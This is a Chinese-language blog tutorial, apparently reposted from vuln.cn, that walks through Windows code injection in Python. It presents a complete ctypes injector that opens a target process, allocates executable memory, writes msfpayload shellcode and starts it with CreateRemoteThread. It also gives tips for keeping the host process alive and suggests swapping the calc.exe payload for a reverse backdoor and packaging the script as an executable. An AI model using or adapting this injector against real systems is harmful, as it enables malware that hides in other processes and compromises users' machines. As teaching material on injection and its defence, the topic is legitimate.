> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.vuln.cn](http://www.vuln.cn/6448)  

* * *

本文为《小学生科普系列》的番外篇，本系列面向小学生，纯科普，大牛莫喷~

教程中所有内容仅供学习研究，请勿用于非法用途，否则…. 我也帮不了你啊…

说起注入，大家第一印象可能还习惯性的停留在 sql 注入，脚本注入（XSS）等。今天 light 同 (jiao) 学(shou)带大家从 web 端回到操作系统，一起探讨 Windows 下的经典注入——内存注入，使用 python 编写一个简单的代码注入程序。

内存注入常见的方法有 dll 注入和代码注入。Dll 注入通俗地讲就是把我们自己的 dll 注入到目标进程的地址空间内，“寄生”在目标进程里执行。Dll 注入需要另外一个 “推进器” 程序将我们的 “寄生虫”dll“注” 进目标进程中。

代码注入和 dll 注入的思路一致，只是 “寄生虫” 代码与 “推进器” 代码在同一个程序里面。

Dll 文件: windows 动态链接库。在 Windows 中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即 DLL 文件，放置于系统中。当我们执行某一个程序时，相应的 DLL 文件就会被调用。

这次我们的实验选取 “代码注入” 这一课题。废话不多说，开始动手！

* * *

写 python 的小程序，light 同学推荐性感的 Sublime text2 +JEDI（python 自动补全插件）。

首先安装 sublime text2 的 “插件管理” 插件 package control：

打开 sublime 后，组合键 “ctrl+~” 调出控制台，将以下代码粘贴进命令行中并回车：

```
#!python
import urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp) if not os.path.exists(ipp) else None;open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read())
```

安装完毕后重启 sublime text2，输入 Ctrl + Shift + P 然后输入 Install Package

![](http://www.vuln.cn/wp-content/uploads/20150211/2015021110461871586.png)

然后输入 “jedi”，回车安装。

![](http://www.vuln.cn/wp-content/uploads/drops/20141229/2014122903513995261file00027.png)

磨刀不误砍柴工，装好插件，我们开始正式撸代码。

* * *

原料：win7、python27、sublime text2、msfpayload

必备技能：windows api 基础、python 基础、metasploit 基础（这个还不会的赶快去这里补习！http://zone.wooyun.org/content/17377）

这次的注入代码主要借助了 python 的 ctypes 库，这个库使得 python 可以直接调用 windows API，非常方便。“为什么不用 c 或者 c++？”，因为我手头边只有一本《gray hat python》。

```
#!python
#-*- coding:utf-8 -*-
#导入sys库以及ctypes库
import sys
from ctypes import *

PAGE_EXECUTE_READWRITE  =  0x00000040
PROCESS_ALL_ACCESS  =  ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  =  ( 0x1000 | 0x2000 )

kernel32  =  windll.kernel32
pid  =  int(sys.argv[1])

if not sys.argv[1]:
    print "Code Injector: ./code_injector.py <PID to inject>"
    sys.exit(0)

# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
shellcode = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d"
"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
"\x2e\x65\x78\x65\x00")

code_size = len(shellcode)

# 获取我们要注入的进程句柄
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

# 为我们的shellcode申请内存
arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# 在内存中写入shellcode
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

# 创建远程线程，指定入口为我们的shellcode头部
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
    print "[*] Failed to inject shellcode. Exiting."
sys.exit(0)

print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
```

句柄：句柄与普通指针的区别在于，指针包含的是引用对象的内存地址，而句柄则是由系统所管理的引用标识，该标识可以被系统重新定位到一个内存地址上。这种间接访问对象的模式增强了系统对引用对象的控制。

可以看到，之所以能进行内存注入，主要归功于 windows 开放的一个关键 api：CreateRemoteThread。这个函数允许我们创建一个在其它进程地址空间中运行的线程 (也称：创建远程线程)。

而整个注入过程可以划分为三个步骤：获取目标进程句柄，把 shellcode 写入内存，创建远程线程。这也是内存注入的基本原理和机制。

在使用 msfpayload 生成 shellcode 时，有两个坑需要大家注意。

坑一： Msfpayload 生成 shellcode 时，不能使用 msfencode，有些资料告诉我们生成 shellcode 时要在后面加上 msfencode -b ‘\x00’ 来避免空字，但是 msfencode 一旦使用，默认就会使用 x86/shikata_ga_nai 等编码器对 shellcode 编码一次。这里 light 同学推荐大家用 msfpayload xxx C 的方式来生成纯净的 shellcode。

坑二：

msfpayload windows/exec CMD = calc.exe C　

直接生成的 shellcode 执行结果是宿主 100% 崩溃，简直就是进程杀手。我在测试过程中，把用来测试的百度云管家崩的天昏地暗。这个坑花了好久才跳出来。

后来号基友用 ollydbg 调试发现 shellcode 退出时直接 exit process，把整个进程都结束了。

![](http://www.vuln.cn/wp-content/uploads/20150211/2015021110461995881.png)

在基友热心帮助下，再参考 msfpayload 官方文档后顿悟，果断修改 EXITFUNC 的值为 thread（默认为 process）：

![](http://www.vuln.cn/wp-content/uploads/20150211/2015021110462064801.png)

测试成功！

![](http://www.vuln.cn/wp-content/uploads/20150211/2015021110462049636.png)

最后，我们可以把这个 python 脚本用 py2exe 打包成 exe 可执行文件。有兴趣的话还可以加上 UI，做成一个可以定制不同注入类型（dll 或代码注入）、注入代码（反向后门或恶作剧程序）的程序。

任何问题或者好的建议请骚扰：[[email protected]](http://www.vuln.cn/cdn-cgi/l/email-protection)

参考文档：

《gray hat python》

http://www.offensive-security.com/metasploit-unleashed/Msfpayload

http://www.google.com

![](http://www.vuln.cn/wp-content/themes/wpgo/caches/c3d4f52f50219a982b96dcfa62ef90aa.jpg)

**本文作者**：[Sofia](http://www.vuln.cn/ "查看Sofia发布的所有文章")

**版权声明**：除非本文有注明出处，否则转载请注明本文来自 http://www.vuln.cn

**本文地址**：http://www.vuln.cn/6448